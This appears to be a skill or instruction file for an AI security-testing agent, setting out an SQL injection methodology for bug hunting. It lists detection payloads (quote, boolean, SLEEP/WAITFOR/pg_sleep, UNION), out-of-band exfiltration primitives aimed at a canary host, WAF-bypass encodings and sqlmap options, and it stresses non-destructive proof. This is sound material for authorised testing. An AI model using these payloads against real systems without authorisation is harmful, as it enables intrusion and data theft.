---
name: sqli
description: "SQL injection methodology: detect error-based, boolean-blind, time-blind, UNION, and OOB SQLi; fingerprint the DBMS; bypass WAFs; and prove impact safely without destructive queries. Auto-loads when a parameter reaches a SQL query, on DB error strings, or when sqli-hunter is engaged."
---

# SQL Injection

Still a top-tier bug when it reaches real data. The goal is a confirmed, non-destructive proof (DB version / current user / a controlled boolean or time oracle) — never a data dump. Deep work goes to `sqli-hunter`. Payloads live in the burp-scan steering. Pairs with oob-verification (blind), safe-exploitation (no destructive SQL), business-impact.

---

## 1. FIND CANDIDATE SINKS
Any parameter that could reach a query: filters, search, `id=`, `sort`/`order_by` (often unparametrizable → injectable), `limit/offset`, JSON body fields, headers used in logging/analytics queries, GraphQL args. Test numeric AND string contexts, and second-order (input stored then used in a later query).

## 2. DETECT (in order of safety/reliability)
- **Error-based:** send `'`, `"`, `')`, `'--`, backslash. A DBMS error string = strong signal + fingerprint:
  - MySQL: `You have an error in your SQL syntax`; MSSQL: `Unclosed quotation mark`; Postgres: `syntax error at or near`; Oracle: `ORA-\d{5}`; SQLite: `unrecognized token`.
- **Boolean-blind:** send a TRUE vs FALSE condition and diff the response:
  `' AND '1'='1` (same as baseline) vs `' AND '1'='2` (differs/empty). Numeric: `1 AND 1=1` vs `1 AND 1=2`. Confirmed only if TRUE≈baseline and FALSE differs consistently.
- **Time-blind** (when no visible diff): `' AND SLEEP(5)-- -` (MySQL), `'; WAITFOR DELAY '0:0:5'--` (MSSQL), `' AND pg_sleep(5)--` (Postgres). Require repeatable ≥5s deltas across trials to rule out jitter.
- **OOB** (when fully blind): DNS/HTTP exfil primitives per DBMS (`xp_dirtree`/`UTL_HTTP`/`LOAD_FILE('\\\\canary\\')`) → confirm via `oob-verification`.
- **UNION** (when results reflect): find column count (`ORDER BY n` / `UNION SELECT NULL,NULL...`), then pull `@@version`/`current_user` into a visible column.

## 3. FINGERPRINT + then tailor
Confirm the DBMS from errors, function behavior (`SLEEP` vs `pg_sleep` vs `WAITFOR`), and concat syntax. Tailor syntax to it. Prefer `sqlmap` with a tight scope (`--batch --level/--risk` modest, `--technique`, cookie/auth) to automate blind extraction of PROOF values only — never `--dump` real user tables.

## 4. WAF BYPASS (when a filter blocks obvious payloads)
Inline comments (`/**/`, `/*!50000...*/` MySQL), case mix, whitespace alternatives (`%09`,`%0a`,`+`), encoding (URL/double/unicode), keyword splitting, `LIKE`/logical equivalents, JSON/second-order paths. If a 403 keys on the literal payload it's a WAF (encode/mutate); if it's a 429 volume-throttle, pace instead — distinguish first (evidence-discipline / disconfirm reflex).

## 5. PROVE IMPACT SAFELY
- Sufficient proof = `version()`, `current_user`, `database()`, or a stable boolean/time oracle, or `COUNT(*)` of a sensitive table. That's enough for a critical report.
- NEVER run destructive SQL (`DROP/DELETE/UPDATE/INSERT/ALTER/GRANT`), never exfiltrate real user rows — read one non-sensitive proof value and stop (safe-exploitation).
- Capture: the exact injectable request, the baseline vs TRUE/FALSE (or timing) responses, and the fingerprint/version output. Impact (business-impact): auth-context data read = High/Critical.

## FALSE POSITIVES
- DB error text inside a `<pre>`/doc/error page that is NOT from your input reaching a query.
- Time delays from network jitter or heavy endpoints (require repeatable deltas + a no-payload control).
- A WAF/security product's error mimicking a DB error — verify the differential is the database.
- `id` echoed verbatim with `SLEEP` a no-op = a type error, not SQLi.
